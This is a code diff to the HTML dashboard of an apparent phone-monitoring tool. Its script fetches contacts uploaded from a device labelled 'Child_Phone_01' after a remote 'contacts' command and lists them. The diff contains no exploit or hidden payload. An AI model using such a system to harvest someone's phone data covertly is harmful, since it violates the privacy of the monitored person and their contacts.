@@ -87,26 +87,29 @@
     </div>
 
     <script>
-        // ⚠️ Render URL aur Device ID sahi karein
-        const RENDER_URL = "https://child-v9no.onrender.com";
+        // Server URL auto-detect karega
+        const RENDER_URL = window.location.origin;
         const DEVICE_ID = "Child_Phone_01";
 
         async function fetchContacts() {
             const container = document.getElementById("contactsContainer");
             
             try {
-                // Sahi API Path ka use:
+                // Sahi API Path jo server.js se match karta hai
                 const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/contacts`);
+                
+                if (!response.ok) throw new Error("Data not found");
+                
                 const data = await response.json();
 
-                container.innerHTML = ""; // Clear loading state
+                container.innerHTML = ""; 
 
                 if(!data || data.length === 0) {
-                    container.innerHTML = "<div style='text-align:center; padding:20px;'>No contacts found on server. Make sure device uploaded them.</div>";
+                    container.innerHTML = "<div style='text-align:center; padding:20px;'>No contacts found on server. Send 'contacts' command first.</div>";
                     return;
                 }
 
-                // Data ko Name ke hisaab se Sort kar dete hain (A-Z)
+                // Sorting
                 data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
 
                 data.forEach(contact => {
@@ -126,11 +129,10 @@
                 });
             } catch (err) {
                 console.error("Error:", err);
-                container.innerHTML = "<div style='text-align:center; color:red; padding:20px;'>Server connection failed.</div>";
+                container.innerHTML = "<div style='text-align:center; color:red; padding:20px;'>No data available yet. Please wait for the phone to upload.</div>";
             }
         }
 
-        // Page load hote hi function chalao
         window.onload = fetchContacts;
     </script>
 </body>
